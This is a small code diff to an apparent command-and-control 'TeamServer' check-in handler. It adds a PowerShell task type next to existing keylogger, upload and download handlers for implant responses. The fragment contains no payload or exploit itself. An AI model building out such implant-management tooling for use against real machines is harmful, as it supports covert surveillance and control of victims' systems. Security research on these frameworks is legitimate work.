@@ -27,6 +27,7 @@ namespace TeamServer.Handlers.CheckinHandler
             _handlers = new Dictionary<Enum, Func<JsonElement, Task>>()
             {
                 { SUCCESS, (element) => successStrategy.ProcessResponseAsync(element) },
+                { TaskType.POWERSHELL, (element) => successStrategy.ProcessResponseAsync(element) },
                 { TaskType.KEYLOGGER_STOP, (element) => keyloggerStrategy.ProcessResponseAsync(element) },
                 { TaskType.UPLOAD, (element) => uploadStrategy.ProcessResponseAsync(element) },
                 { TaskType.DOWNLOAD, (element) => downloadStrategy.ProcessResponseAsync(element) },
